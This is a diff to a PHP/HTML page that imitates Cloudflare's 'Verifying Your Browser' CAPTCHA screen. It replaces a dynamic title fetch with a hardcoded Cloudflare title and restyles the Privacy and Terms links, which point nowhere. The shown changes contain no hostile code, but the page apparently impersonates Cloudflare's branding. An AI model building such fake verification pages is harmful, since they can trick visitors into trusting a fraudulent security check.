@@ -3,50 +3,11 @@
 <head>
 	<meta charset="utf-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1">
-
+  <title>Verifying Your Browser - DDoS Protection | Cloudflare.</title>
 
   <?php
     // session start
     session_start();
-  ?>
-
-	<!-- Title -->
-  <?php
-      function fetch_url($url) {
-          $ch = curl_init();
-          curl_setopt($ch, CURLOPT_URL, $url);
-          curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // Follow redirects
-          curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Timeout for faster failure handling
-          $data = curl_exec($ch);
-          curl_close($ch);
-          return $data;
-      }
-       
-      function get_page_title($domain) {
-          // Fetch the HTML from the domain
-          $html = fetch_url($domain);
-          if ($html) {
-              // Use regex to find the <title> tag
-              preg_match('/<title>(.*?)<\/title>/', $html, $matches);
-              if (!empty($matches[1])) {
-                  return trim($matches[1]); // Return the title text
-              }
-          }
-          
-          return false; // Return false if no title is found
-      }
-       
-      // Get the root domain (main domain)
-      $host = "http://" . $_SERVER['HTTP_HOST']; // For example, "http://127.0.0.1"
-       
-      // Fetch the title from the main domain
-      $title = get_page_title($host);
-       
-      // Only output the title if found
-      if ($title) {
-          echo '<title>' . htmlspecialchars($title) . '</title>';
-      }
   ?>
 
   <!-- Favicon -->
@@ -195,7 +156,7 @@
         <div class="captcha-footer">
           <img class="captcha-logo" src="./assets/img/dark_logo.svg" alt="Cloudflare Logo">
           <div class="captcha-privacy">
-            <a href="#" style="color: #ccc;">Privacy</a> • <a href="#" style="color: #ccc;">Terms</a>
+            <a href="#" style="color: #ccc; text-decoration: underline;">Privacy</a> • <a href="#" style="color: #ccc; text-decoration: underline;">Terms</a>
           </div>
         </div>
 
@@ -239,7 +200,7 @@
         <div class="captcha-footer">
           <img class="captcha-logo" src="./assets/img/logo-cloudflare-dark.svg" alt="Cloudflare Logo">
           <div class="captcha-privacy">
-            <a href="#">Privacy</a> • <a href="#">Terms</a>
+            <a href="#" style="text-decoration: underline;">Privacy</a> • <a href="#" style="text-decoration: underline;">Terms</a>
           </div>
         </div>
 
